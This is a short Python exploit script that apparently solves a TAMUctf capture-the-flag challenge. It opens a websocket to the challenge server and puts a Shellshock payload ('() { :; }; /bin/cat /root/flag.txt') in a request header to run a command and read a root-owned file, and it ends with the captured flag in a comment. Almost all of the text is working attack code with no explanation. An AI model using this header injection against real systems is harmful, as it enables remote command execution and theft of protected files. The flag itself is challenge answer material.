#!/usr/bin/env python3

# pip install websocket_client
import websocket

if __name__ == '__main__':
    ws = websocket.WebSocket()
    ws.connect("ws://challenges.tamuctf.com:3012/", header=["BC_LINE_LENGTH: () { :; }; /bin/cat /root/flag.txt "])
    while True:
        inp = str(input('> '))
        ws.send(inp+'\n')
        result = ws.recv()
        print("=> %s" % str(result.decode("utf-8")))
    ws.close()
# gigem{sh0CKd_by_7h3_ca1culatoR}